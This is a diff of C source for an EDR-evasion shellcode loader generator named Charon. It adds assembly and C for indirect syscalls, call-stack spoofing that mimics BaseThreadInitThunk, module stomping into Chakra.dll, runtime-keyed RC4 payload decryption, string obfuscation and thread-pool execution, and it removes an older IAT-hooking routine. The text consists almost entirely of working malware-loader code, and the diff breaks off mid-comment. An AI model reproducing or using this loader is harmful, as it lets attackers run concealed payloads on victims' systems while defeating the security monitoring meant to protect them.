@@ -5,23 +5,23 @@
  *
  *  Purpose:
  *      Generates a standalone executable (CharonArtifact.exe) designed to
- * execute shellcode while evading EDR (Endpoint Detection and Response) hooks.
+ *      execute shellcode while evading EDR (Endpoint Detection and Response)
+ * hooks.
  *
  *  Key Techniques:
  *      1. Indirect Syscalls: Bypasses user-mode hooks by executing the
- * 'syscall' instruction within the memory space of ntdll.dll, rather than
- * calling the hooked API directly.
- *      2. Stack Spoofing: Manipulates the stack frame to make the syscall
- * return address point to a legitimate location (a 'gadget' in ntdll or
- * kernel32), hiding the origin of the call.
+ *         'syscall' instruction within the memory space of ntdll.dll.
+ *      2. Stack Spoofing (SilentMoonwalk): Manipulates the call stack to make
+ *         syscalls appear as if they originated from legitimate APIs.
+ *         It dynamically calculates the correct stack frame size for the
+ *         spoofed return address to ensure stability and stealth.
  *      3. Dynamic Gadget Search: Scans loaded modules for 'jmp REG' gadgets
- * across all non-volatile registers (RBX, RDI, RSI, R12-R15) to ensure
- * compatibility.
- *      4. IAT Hooking: Patches the Import Address Table of the running process
- * to redirect standard API calls (like VirtualAlloc) through the evasion
- * engine.
+ *         across all non-volatile registers (RBX, RDI, RSI, R12-R15).
+ *      4. Module Stomping: Injects the payload into the .text section of a
+ *         legitimate DLL (e.g., Chakra.dll) to back the execution with a valid
+ *         file on disk.
  *      5. Payload Protection: Uses RC4 encryption and 'KeyGuard' (runtime key
- * calculation) to prevent static analysis of the payload.
+ *         calculation) to prevent static analysis of the payload.
  *
  *  Author: vari.sh
  * ======================================================================================
@@ -44,19 +44,23 @@ const char *g_HellHallAsm =
     "EXTERN qTableAddr:QWORD\n"
     "EXTERN qGadgetAddress:QWORD\n"
     "EXTERN qGadgetType:DWORD\n"
+    "EXTERN qFrameSize:DWORD\n"
     "EXTERN qSavedReg:QWORD\n"
     "EXTERN qSavedRetAddr:QWORD\n"
     ".code\n"
+    "\n"
 
     // -----------------------------------------------------------------------
     // SetTableAddr: Configures the engine with necessary pointers.
-    // RCX = Table Address, RDX = Gadget Address, R8 = Gadget Type
+    // RCX = Table Address, RDX = Gadget Address, R8 = Gadget Type, R9 =
+    // FrameSize
     // -----------------------------------------------------------------------
     "    PUBLIC SetTableAddr\n"
     "    SetTableAddr PROC\n"
     "        mov qTableAddr, rcx\n"
     "        mov qGadgetAddress, rdx\n"
     "        mov qGadgetType, r8d\n"
+    "        mov qFrameSize, r9d\n"
     "        xor rax, rax\n"
     "        inc rax\n"
     "        ret\n"
@@ -70,11 +74,33 @@ const char *g_HellHallAsm =
     // 3. Jumps to the 'jmp REG' gadget in ntdll/kernel32.
     // -----------------------------------------------------------------------
     "    SyscallExec PROC\n"
-    "        mov r10, rcx\n" // Save syscall argument (RCX holds the first arg
-                             // in x64 fastcall, but syscalls expect it in R10)
-
-    // Determine which register specific path to take based on the found gadget
-    // type
+    "        mov r10, rcx\n"
+    "        pop rcx             ; Pop Return Address\n"
+    "        mov qSavedRetAddr, rcx\n"
+    "        mov r11, rax        ; Save Syscall Index (RAX) to R11\n"
+    "\n"
+    "        ; Save RSI/RDI to Stack (PUSH)\n"
+    "        push rsi\n"
+    "        push rdi\n"
+    "\n"
+    "        ; Spoof Stack Frame Size\n"
+    "        xor rax, rax\n"
+    "        mov eax, qFrameSize\n"
+    "        sub rsp, rax\n"
+    "\n"
+    "        ; Copy Stack Arguments (Arg5+) to New Stack\n"
+    "        ; Offset calc: OldRSP(AfterPop) + 20h = Arg5.\n"
+    "        ; Current RSP = OldRSP(AfterPop) - 16(Pushes) - FrameSize.\n"
+    "        ; Arg5 - CurrentRSP = 20h + 10h + FrameSize = FrameSize + 30h.\n"
+    "        lea rsi, [rsp + rax + 30h]  ; Source: Old Args\n"
+    "        lea rdi, [rsp + 20h]        ; Dest: New RSP + 20h\n"
+    "        mov rcx, 10h                ; Copy 128 bytes\n"
+    "        cld\n"
+    "        rep movsq\n"
+    "\n"
+    "        ; Restore Syscall Index\n"
+    "        mov rax, r11\n"
+    "\n"
     "        cmp qGadgetType, 0\n"
     "        je UseRBX\n"
     "        cmp qGadgetType, 1\n"
@@ -89,8 +115,8 @@ const char *g_HellHallAsm =
     "        je UseR14\n"
     "        cmp qGadgetType, 6\n"
     "        je UseR15\n"
-    "        jmp UseRBX\n" // Default fallback
-
+    "        jmp UseRBX\n"
+    "\n"
     // --- Register Specific Chains ---
     // Each block saves the register, loads the return address, and jumps to the
     // call execution
@@ -131,16 +157,12 @@ const char *g_HellHallAsm =
     "        mul rdx\n"
     "        mov rdx, qTableAddr\n"
     "        add rdx, rax\n"
-    "        mov rax, [rdx + 08h]\n" // Load SSN (Syscall Number)
-    "        mov r11, [rdx + 10h]\n" // Load 'syscall; ret' address
+    "        mov rax, [rdx + 08h]\n"
+    "        mov r11, [rdx + 10h]\n"
     "        pop rdx\n"
-    "        pop rcx\n"
-    "        mov qSavedRetAddr, rcx\n" // Save original return address logic
-    "        mov rcx, r10\n"           // Restore first argument
-    "        push qGadgetAddress\n"    // Push the gadget address onto the stack
-                                       // (The 'jmp REG' instruction will return
-                                       // here conceptually)
-    "        jmp r11\n"                // Jump to 'syscall' instruction
+    "        mov rcx, r10\n"
+    "        push qGadgetAddress\n"
+    "        jmp r11\n"
     "\n"
 
     // --- Return Logic ---
@@ -162,7 +184,7 @@ const char *g_HellHallAsm =
     "        cmp qGadgetType, 6\n"
     "        je RestR15\n"
     "        jmp RestRBX\n"
-
+    "\n"
     // Restore the non-volatile register we hijacked
     "    RestRBX:\n"
     "        mov rbx, qSavedReg\n"
@@ -186,8 +208,16 @@ const char *g_HellHallAsm =
     "        mov r15, qSavedReg\n"
     "        jmp Fin\n"
     "    Fin:\n"
-    "        mov r11, qSavedRetAddr\n" // Restore the actual return address
-    "        jmp r11\n"                // Return to caller
+    "        ; Restore Stack\n"
+    "        mov rcx, rax        ; Save Syscall Status (RAX)\n"
+    "        xor rax, rax\n"
+    "        mov eax, qFrameSize\n"
+    "        add rsp, rax\n"
+    "        pop rdi\n"
+    "        pop rsi\n"
+    "        mov rax, rcx        ; Restore Syscall Status\n"
+    "        \n"
+    "        jmp qSavedRetAddr\n"
     "    SyscallExec ENDP\n";
 
 // =================================================================================
@@ -196,22 +226,50 @@ const char *g_HellHallAsm =
 // This string contains the source code for the generated artifact.
 // It is written to 'artifact.c' and compiled.
 const char *g_StubTemplate =
+    // Headers
     "#include <windows.h>\n"
     "#include <stdio.h>\n"
     "#include <string.h>\n"
     "\n"
+    // --- OPSEC TOGGLE ---
+    // Uncomment the line below to silence all prints for Production
+    "// #define printf(...) \n"
+    "\n"
 
-    // --- [SECTION 1] GLOBALS FOR ASM ---\n"
+    // -------------------------------------------------------------------------
+    // [SECTION 1] GLOBALS FOR ASM
     // These globals bridge the C code and the Assembly engine.
+    // -------------------------------------------------------------------------
     "void* qTableAddr = NULL;\n"     // Base address of the syscall table
     "void* qGadgetAddress = NULL;\n" // Address of the found 'jmp REG' gadget
     "DWORD qGadgetType = 0;\n"      // Type of gadget found (0=RBX, 1=RDI, etc.)
-    "void* qSavedReg = NULL;\n"     // Space to save the register context
-    "void* qSavedRetAddr = NULL;\n" // Space to save the return address
+    "DWORD qFrameSize = 0;\n"       // Spoofed Frame Size\n"
+    "void* qSavedReg = NULL;\n"     // Space to save the register context\n"
+    "void* qSavedRetAddr = NULL;\n" // Space to save the return address\n"
     "\n"
 
-    // --- [SECTION 2] INTERNAL STRUCTS ---\n"
-    // Structures to manage syscall entries and Windows internal data
+    // -------------------------------------------------------------------------
+    // [SECTION 2] INTERNAL STRUCTS
+    // -------------------------------------------------------------------------
+    // UNWIND_CODE structure for stack walking
+    "typedef struct _UNWIND_CODE {\n"
+    "    BYTE CodeOffset;\n"
+    "    BYTE UnwindOp : 4;\n"
+    "    BYTE OpInfo : 4;\n"
+    "} UNWIND_CODE, *PUNWIND_CODE;\n"
+    "\n"
+    // UNWIND_INFO structure
+    "typedef struct _UNWIND_INFO {\n"
+    "    BYTE Version : 3;\n"
+    "    BYTE Flags : 5;\n"
+    "    BYTE SizeOfProlog;\n"
+    "    BYTE CountOfCodes;\n"
+    "    BYTE FrameRegister : 4;\n"
+    "    BYTE FrameOffset : 4;\n"
+    "    UNWIND_CODE UnwindCode[1];\n"
+    "} UNWIND_INFO, *PUNWIND_INFO;\n"
+    "\n"
+    // Syscall Entry structure
     "typedef struct _SYSCALL_ENTRY {\n"
     "    PVOID pAddress;      // 0x00 - Original Address\n"
     "    DWORD64 dwSsn;       // 0x08 - Syscall Number (SSN)\n"
@@ -219,9 +277,10 @@ const char *g_StubTemplate =
     "    DWORD64 dwHash;      // 0x18 - Hash of the function name\n"
     "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
     "\n"
+    // Syscall List
     "typedef struct _SYSCALL_LIST {\n"
     "    DWORD Count;\n"
-    "    SYSCALL_ENTRY Entries[1024];\n"
+    "    SYSCALL_ENTRY Entries[512];\n"
     "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
     "\n"
     // Native definitions needed for traversing PEB (Process Environment Block)
@@ -240,7 +299,9 @@ const char *g_StubTemplate =
     // --- GLOBALS ---\n"
     "SYSCALL_LIST SyscallList;\n"
     "PVOID g_pSystemFunction032 = NULL;\n"
-    "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType);\n"
+    "PVOID g_pLoadLibraryExA = NULL;\n"
+    "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType, DWORD "
+    "dwFrameSize);\n"
     "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
     "\n"
 
@@ -294,9 +355,8 @@ const char *g_StubTemplate =
     "pDos->e_lfanew);\n"
     "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
     "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
-    "        if (pSection[i].Characteristics & 0x20000020) {\n" // Check for
-                                                                // Executable
-                                                                // section
+    "        if (pSection[i].Characteristics & 0x20000020) {\n"
+    "// Check for Executable section\n"
     "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + "
     "pSection[i].VirtualAddress);\n"
     "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
@@ -320,6 +380,8 @@ const char *g_StubTemplate =
     "    }\n"
     "    return NULL;\n"
     "}\n"
+    "\n"
+    "typedef HMODULE (WINAPI *fnLoadLibraryExA)(LPCSTR, HANDLE, DWORD);\n"
     "\n"
     // Helper to find export by hash
     "PVOID GetProcAddressByHash(HMODULE hMod, DWORD64 hHash) {\n"
@@ -350,8 +412,12 @@ const char *g_StubTemplate =
     "                 if(pDot) {\n"
     "                     *pDot = 0;\n"
     "                     char szDll[260]; sprintf(szDll, \"%s.dll\", szFwd);\n"
-    "                     return GetProcAddress(LoadLibraryA(szDll), pDot + "
-    "1);\n"
+    "                     if (g_pLoadLibraryExA) {\n"
+    "                         return "
+    "GetProcAddress(((fnLoadLibraryExA)g_pLoadLibraryExA)(szDll, NULL, 0), "
+    "pDot + 1);\n"
+    "                     }\n"
+    "                     return NULL;\n"
     "                 }\n"
     "            }\n"
     "            return pFunc;\n"
@@ -361,8 +427,69 @@ const char *g_StubTemplate =
     "}\n"
     "\n"
 
-    // --- [SECTION 4] INIT ENGINE ---\n"
-    // Initialize the API Resolver and Gadget Hunter
+    // -------------------------------------------------------------------------
+    // [SECTION 4] INIT ENGINE
+    // -------------------------------------------------------------------------
+    "typedef PRUNTIME_FUNCTION (NTAPI *fnRtlLookupFunctionEntry)(DWORD64 "
+    "ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);\n"
+    "\n"
+    // -----------------------------------------------------------------------
+    // CalcFrameSize: Calculates the stack frame size of a target function.
+    // -----------------------------------------------------------------------
+    // This function parses the .pdata (Exception Directory) of a module to find
+    // the UNWIND_INFO for a given function. It then iterates through the unwind
+    // codes to calculate exactly how much stack space the function allocates.
+    //
+    // We use this to 'spoof' a legitimate stack frame size. By making our
+    // malicious syscall stack look exactly like a call from
+    // 'BaseThreadInitThunk' or similar, we blend in with normal execution flow.
+    "DWORD CalcFrameSize(PVOID pFunc) {\n"
+    "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
+    "    char sRtl[] = "
+    "{'R','t','l','L','o','o','k','u','p','F','u','n','c','t','i','o','n','E','"
+    "n','t','r','y',0};\n"
+    "    \n"
+    // Dynamically resolve RtlLookupFunctionEntry to access Unwind Info
+    "    PVOID pH = GetProcAddress(GetModuleHandleA(sK32), sRtl);\n"
+    "    if(!pH) return 0x28;\n"
+    "    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)pH;\n"
+    "    DWORD64 ImageBase;\n"
+    "    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);\n"
+    "    if(!pRF) return 0x28;\n"
+    "    \n"
+    "    PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);\n"
+    "    DWORD size = 0;\n"
+    "    \n"
+    // Parse Unwind Codes to sum up stack allocations
+    "    for(int i=0; i<pUI->CountOfCodes; i++) {\n"
+    "        UNWIND_CODE* pCode = &pUI->UnwindCode[i];\n"
+    "        if(pCode->UnwindOp == 2) { size += (pCode->OpInfo * 8) + 8; }     "
+    " // UWOP_ALLOC_SMALL\n"
+    "        else if(pCode->UnwindOp == 0) { size += 8; }                      "
+    "  // UWOP_PUSH_NONVOL\n"
+    "        else if(pCode->UnwindOp == 4) { i++; }                            "
+    "  // UWOP_SAVE_NONVOL\n"
+    "        else if(pCode->UnwindOp == 1) {                                   "
+    "  // UWOP_ALLOC_LARGE\n"
+    "            if(pCode->OpInfo == 0) { size += "
+    "(*(USHORT*)&pUI->UnwindCode[i+1]) * 8; i++; }\n"
+    "            else { size += *(DWORD*)&pUI->UnwindCode[i+1]; i+=2; }\n"
+    "        }\n"
+    "    }\n"
+    // Align to 16 bytes for x64 stack alignment compliance
+    "    if(size % 16 != 0) size = (size + 16) & ~15;\n"
+    "    if(size < 0x100) size = 0x100; // Enforce minimum frame size for "
+    "stability\n"
+    "    return size;\n"
+    "}\n"
+    "\n"
+    // -----------------------------------------------------------------------
+    // InitApi: Initializes the Evasion Engine.
+    // -----------------------------------------------------------------------
+    // 1. Locates Ntdll.dll base address.
+    // 2. Finds a suitable 'jmp REG' gadget for stack spoofing.
+    // 3. Calculates the frame size of a legitimate function to mimic.
+    // 4. Resolves syscall numbers (SSNs) via Hell's Gate/Halo's Gate.
     "BOOL InitApi() {\n"
     "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
     "    PVOID ntdllBase = GetModuleHandleA(sNt);\n"
@@ -386,8 +513,18 @@ const char *g_StubTemplate =
     "    \n"
     "    DWORD idx = 0;\n"
     "    \n"
-    "    // 1. Find Stack Spoof Gadget: Try kernel32 first, then ntdll\n"
+    // [STEP 1] Find Stack Spoof Gadget
+    // We look for 'jmp RBX', 'jmp RDI', etc. in kernel32 or ntdll.
+    // This gadget allows us to jump to the syscall instruction while
+    // controlling registers.
     "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
+    "    \n"
+    // Resolve LoadLibraryExA
+    "    char sLoad[] = "
+    "{'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};\n"
+    "    g_pLoadLibraryExA = GetProcAddress(GetModuleHandleA(sK32), sLoad);\n"
+    "    if(!g_pLoadLibraryExA) { printf(\"[!] Failed to resolve "
+    "LoadLibraryExA\\n\"); return FALSE; }\n"
     "    \n"
     "    qGadgetAddress = FindGadgetInModule(sK32, &qGadgetType);\n"
     "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(sNt, "
@@ -395,11 +532,24 @@ const char *g_StubTemplate =
     "    if(!qGadgetAddress) { printf(\"[!] Gadget not found\\n\"); return "
     "FALSE; }\n"
     "    \n"
-    "    printf(\"[+] Found Gadget at %p (Type: %d)\\n\", qGadgetAddress, "
-    "qGadgetType);\n"
-    "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType);\n"
+    // [STEP 2] Calculate Spoof Frame Size
+    // We mimic 'BaseThreadInitThunk' to make the stack look like a fresh thread
+    // start.
+    "    char sBase[] = "
+    "{'B','a','s','e','T','h','r','e','a','d','I','n','i','t','T','h','u','n','"
+    "k',0};\n"
+    "    PVOID pTarget = GetProcAddress(GetModuleHandleA(sK32), sBase);\n"
+    "    if(pTarget) qFrameSize = CalcFrameSize(pTarget);\n"
+    "    else qFrameSize = 0x38; // Fallback\n"
     "    \n"
-    "    // 2. Resolve Syscalls: Walk the export table of ntdll\n"
+    "    printf(\"[+] Found Gadget at %p (Type: %d) | Frame: 0x%X\\n\", "
+    "qGadgetAddress, "
+    "qGadgetType, qFrameSize);\n"
+    "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType, "
+    "qFrameSize);\n"
+    "    \n"
+    // [STEP 3] Resolve Syscalls (Halos Gate)
+    // Walk global exports of ntdll.dll to find syscalls and their SSNs.
     "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
     "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
     "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
@@ -421,14 +571,15 @@ const char *g_StubTemplate =
     "        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);\n"
     "        \n"
     "        idx++;\n"
-    "        if (idx >= 1024) break;\n"
+    "        if (idx >= 512) break;\n"
     "    }\n"
     "    SyscallList.Count = idx;\n"
     "    \n"
-    "    // Resolve SystemFunction032\n"
-    "    // Resolve SystemFunction032\n"
+    // Resolve SystemFunction032 for data decryption
     "    char sAdv[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};\n"
-    "    g_pSystemFunction032 = GetProcAddressByHash(LoadLibraryA(sAdv), "
+    "    g_pSystemFunction032 = "
+    "GetProcAddressByHash(((fnLoadLibraryExA)g_pLoadLibraryExA)(sAdv, NULL, "
+    "0), "
     "0xB1E6B89241A41B94);\n"
     "    if(!g_pSystemFunction032) printf(\"[!] Failed to resolve "
     "SystemFunction032\\n\");\n"
@@ -439,81 +590,9 @@ const char *g_StubTemplate =
     "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, "
     "PSIZE_T, ULONG, PULONG);\n"
     "\n"
-    // InstallIATHooks: Redirects Import Address Table entries to use our
-    // indirect syscall engine
-    "void InstallIATHooks() {\n"
-    "    PVOID pModule = GetModuleHandleA(NULL);\n"
-    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
-    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + "
-    "pDos->e_lfanew);\n"
-    "    if "
-    "(pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == "
-    "0) return;\n"
-    "    \n"
-    "    // Locate the internal NtProtectVirtualMemory syscall entry\n"
-    "    int idxProtect = -1;\n"
-    "    DWORD64 hProt = 0x858BCB1046FB6A37; // Hash for "
-    "NtProtectVirtualMemory\n"
-    "    for(int i=0; i<SyscallList.Count; i++) {\n"
-    "        if(SyscallList.Entries[i].dwHash == hProt) { idxProtect = i; "
-    "break; }\n"
-    "    }\n"
-    "    if(idxProtect == -1) return;\n"
-    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
-    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase "
-    "+ (idxProtect * 16));\n"
-    "\n"
-    "    // Walk Imports\n"
-    "    PIMAGE_IMPORT_DESCRIPTOR pImport = "
-    "(PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pModule + "
-    "pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]."
-    "VirtualAddress);\n"
-    "    while (pImport->Name) {\n"
-    "        char* szModName = (char*)((PBYTE)pModule + pImport->Name);\n"
-    "        char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
-    "        if (_stricmp(szModName, sNt) == 0) {\n"
-    "            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pModule "
-    "+ pImport->FirstThunk);\n"
-    "            PIMAGE_THUNK_DATA pOrgThunk = "
-    "(PIMAGE_THUNK_DATA)((PBYTE)pModule + pImport->OriginalFirstThunk);\n"
-    "            if(!pOrgThunk) pOrgThunk = pThunk;\n"
-    "            \n"
-    "            while (pOrgThunk->u1.Function) {\n"
-    "                if (!(pOrgThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {\n"
-    "                    PIMAGE_IMPORT_BY_NAME pImportName = "
-    "(PIMAGE_IMPORT_BY_NAME)((PBYTE)pModule + pOrgThunk->u1.AddressOfData);\n"
-    "                    DWORD64 dwHash = djb2((PBYTE)pImportName->Name);\n"
-    "                    // If import matches a syscall we know, hook it\n"
-    "                    for(DWORD i=0; i < SyscallList.Count; i++) {\n"
-    "                        if (SyscallList.Entries[i].dwHash == dwHash) {\n"
-    "                            PVOID pCtx = (PVOID)(&pThunk->u1.Function);\n"
-    "                            SIZE_T sSize = sizeof(PVOID);\n"
-    "                            DWORD oldProtect = 0;\n"
-    "                            // Change protection to RW, Write Hook, "
-    "Restore Protection\n"
-    "                            if(fProt((HANDLE)-1, &pCtx, &sSize, "
-    "PAGE_READWRITE, &oldProtect) == 0) {\n"
-    "                                PVOID pNewFunc = (PVOID)(pStubBase + (i * "
-    "16));\n"
-    "                                pThunk->u1.Function = "
-    "(ULONG_PTR)pNewFunc;\n"
-    "                                fProt((HANDLE)-1, &pCtx, &sSize, "
-    "oldProtect, &oldProtect);\n"
-    "                            }\n"
-    "                            break;\n"
-    "                        }\n"
-    "                    }\n"
-    "                }\n"
-    "                pThunk++;\n"
-    "                pOrgThunk++;\n"
-    "            }\n"
-    "        }\n"
-    "        pImport++;\n"
-    "    }\n"
-    "}\n"
-    "\n"
-
-    // --- [SECTION 5] CONFIG & PAYLOAD ---\n"
+    // -------------------------------------------------------------------------
+    // [SECTION 5] CONFIG & PAYLOAD
+    // -------------------------------------------------------------------------
     "#define KEY_SIZE 16\n"
     "#define HINT_BYTE {{HINT_BYTE}}\n"
     "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
@@ -529,59 +608,105 @@ const char *g_StubTemplate =
     "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID);\n"
     "\n"
 
-    // --- [ENTRY POINT] ---\n"
+    // -------------------------------------------------------------------------
+    // [ENTRY POINT]
+    // -------------------------------------------------------------------------
     "int main() {\n"
+    "    setvbuf(stdout, NULL, _IONBF, 0);\n"
     "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; "
     "HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
     "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
     "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return -1; }\n"
-    "    printf(\"[+] Installing IAT Hooks...\\n\");\n"
-    "    InstallIATHooks();\n"
     "\n"
-    "    DWORD64 hAlloc = 0xF5BD373480A6B89B; // NtAllocateVirtualMemory\n"
-    "    int idxAlloc = -1, idxProtect = -1;\n"
-    "    for(int i=0; i<SyscallList.Count; i++) {\n"
-    "        if(SyscallList.Entries[i].dwHash == hAlloc) idxAlloc = i;\n"
+    // -------------------------------------------------------------------------
+    // [STAGE 1] Module Stomping Setup
+    // We load a legitimate DLL (Chakra.dll) to use as a backing file for our
+    // payload. This avoids 'unbacked executable memory' indicators.
+    // -------------------------------------------------------------------------
+    "    printf(\"[+] Loading Chakra.dll for Module Stomping...\\n\");\n"
+    "    char sChakra[] = {'C','h','a','k','r','a','.','d','l','l',0};\n"
+    "    HMODULE hChakra = ((fnLoadLibraryExA)g_pLoadLibraryExA)(sChakra, "
+    "NULL, 0x1);\n"
+    "    if (!hChakra) { printf(\"[!] Chakra.dll not found\\n\"); return -1; "
+    "}\n"
+    "    \n"
+    // Find .text section to inject into
+    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hChakra;\n"
+    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hChakra + "
+    "pDos->e_lfanew);\n"
+    "    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n"
+    "    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
+    "        char* sName = (char*)pSec[i].Name;\n"
+    "        if (strncmp(sName, \".text\", 5) == 0) {\n"
+    "            pAddr = (PVOID)((PBYTE)hChakra + pSec[i].VirtualAddress + "
+    "4096);\n"
+    "            // Safety check: Ensure payload fits in the section\n"
+    "            if (sSize + 4096 > pSec[i].Misc.VirtualSize) { printf(\"[!] "
+    "Payload "
+    "too big for .text\\n\"); return -1; }\n"
+    "            break;\n"
+    "        }\n"
     "    }\n"
-    "    if (idxAlloc == -1) return -1;\n"
-    "    \n"
-    "    // Use STUB for Allocation (Indirect + Stack Spoof)\n"
+    "    if (!pAddr) { printf(\"[!] .text section not found in "
+    "Chakra.dll\\n\"); return -1; }\n"
+    "    printf(\"[+] Found target memory at %p (File-Backed)\\n\", pAddr);\n"
+    "\n"
+    // -------------------------------------------------------------------------
+    // [STAGE 2] Preparation (RW)
+    // Use Indirect Syscall (NtProtectVirtualMemory) to make the .text section
+    // Writable.
+    // -------------------------------------------------------------------------
+    // Resolve Protect SSN index
+    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
+    "    int idxProtect = -1;\n"
+    "    for(int i=0; i<SyscallList.Count; i++) {\n"
+    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
+    "    }\n"
     "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
-    "    fnNtAllocateVirtualMemory fAlloc = "
-    "(fnNtAllocateVirtualMemory)(pStubBase + (idxAlloc * 16));\n"
+    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase "
+    "+ (idxProtect * 16));\n"
     "    \n"
-    "    printf(\"[+] Allocating payload memory...\\n\");\n"
-    "    NTSTATUS status = fAlloc(hProc, &pAddr, 0, &sSize, MEM_COMMIT | "
-    "MEM_RESERVE, PAGE_READWRITE);\n"
-    "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); "
+    "    printf(\"[+] Changing permissions to RW...\\n\");\n"
+    "    NTSTATUS status = fProt(hProc, &pAddr, &sSize, PAGE_READWRITE, "
+    "&dwOld);\n"
+    "    if(status != 0) { printf(\"[!] Protect (RW) Failed: 0x%X\\n\", "
+    "status); "
     "return -1; }\n"
     "\n"
-    "    printf(\"[+] Decrypting payload...\\n\");\n"
-    "    // KeyGuard: Runtime Key Calculation\n"
+    // -------------------------------------------------------------------------
+    // [STAGE 3] Payload Decryption
+    // Runtime calculation of the key (KeyGuard) and RC4 decryption.
+    // -------------------------------------------------------------------------
+    "    printf(\"[+] Decrypting payload into module...\\n\");\n"
+    // KeyGuard: Brute-force the hint byte to derive the real key at runtime
     "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
     "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
     "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, "
     "Payload};\n"
     "    fnSystemFunction032 Decrypt = "
     "(fnSystemFunction032)g_pSystemFunction032;\n"
+    "    \n"
+    // Copy encrypted payload to target and decrypt in place
     "    memcpy(pAddr, Payload, sizeof(Payload));\n"
     "    d.Buffer = pAddr;\n"
     "    Decrypt(&d, &k);\n"
     "\n"
-    "    // Resolve Protect\n"
-    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
-    "    for(int i=0; i<SyscallList.Count; i++) {\n"
-    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
-    "    }\n"
-    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase "
-    "+ (idxProtect * 16));\n"
-    "\n"
+    // -------------------------------------------------------------------------
+    // [STAGE 4] Finalize (RX)
+    // Restore permissions to Read+Execute.
+    // -------------------------------------------------------------------------
     "    printf(\"[+] Changing permissions to RX...\\n\");\n"
     "    status = fProt(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
-    "    if(status != 0) { printf(\"[!] Protect Failed: 0x%X\\n\", status); "
+    "    if(status != 0) { printf(\"[!] Protect (RX) Failed: 0x%X\\n\", "
+    "status); "
     "return -1; }\n"
     "\n"
+    // -------------------------------------------------------------------------
+    // [STAGE 5] Execution
+    // Use Thread Pool APIs to execute the payload. This mimics legitimate work
+    // items.
+    // -------------------------------------------------------------------------
     "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
     "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
     "    HMODULE hNt = GetModuleHandleA(sNt);\n"
@@ -710,7 +835,10 @@ int main(int argc, char *argv[]) {
   srand((unsigned int)time(NULL));
   const char *shellcodeFile = argv[1];
 
-  // 1. Read Payload
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 1] Read Payload
+  // Read the raw shellcode bytes from the provided file.
+  // -----------------------------------------------------------------------
   DWORD shellcodeSize = 0;
   unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
   if (!shellcode) {
@@ -718,7 +846,10 @@ int main(int argc, char *argv[]) {
     return 1;
   }
 
-  // 2. Encrypt Payload
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 2] Encrypt Payload
+  // Use RC4 encryption with KeyGuard (obfuscated key derivation).
